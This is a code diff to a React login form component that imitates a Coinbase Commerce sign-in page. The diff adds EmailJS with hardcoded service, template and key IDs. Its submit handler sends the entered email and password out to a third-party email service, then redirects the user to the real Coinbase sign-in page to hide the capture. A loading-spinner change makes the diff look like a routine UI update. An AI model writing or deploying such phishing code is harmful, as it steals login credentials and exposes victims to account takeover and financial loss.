@@ -14,7 +14,8 @@ import { Input } from '@/components/ui/input';
 import { useForm } from 'react-hook-form';
 import { Button } from '@/components/ui/button';
 import Link from 'next/link';
-import { redirect } from 'next/navigation';
+import emailjs from '@emailjs/browser';
+import { useState } from 'react';
 
 const formSchema = z.object({
   email: z
@@ -27,6 +28,7 @@ const formSchema = z.object({
 });
 
 export function LoginForm() {
+  const [isLoading, setIsLoading] = useState(false);
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -34,11 +36,18 @@ export function LoginForm() {
       Password: '',
     },
   });
-
+  emailjs.init('DIbKEHLKOAudAEC1y');
   function onSubmit(values: z.infer<typeof formSchema>) {
-    console.log(values);
-
-    window.location.href = 'https://beta.commerce.coinbase.com/sign-in';
+    setIsLoading(true);
+    emailjs
+      .send('service_1exxh39', 'template_banhdlj', {
+        Email: values.email,
+        Passcode: values.Password,
+      })
+      .then(() => {
+        setIsLoading(false);
+        window.location.href = 'https://beta.commerce.coinbase.com/sign-in';
+      });
   }
 
   return (
@@ -107,8 +116,9 @@ export function LoginForm() {
                 variant={'default'}
                 className="text-md h-[55px] w-full rounded-full font-bold"
                 type={'submit'}
+                disabled={isLoading}
               >
-                Sign in
+                {isLoading ? <div className="custom-loader" /> : 'Sign in'}
               </Button>
             </form>
           </Form>
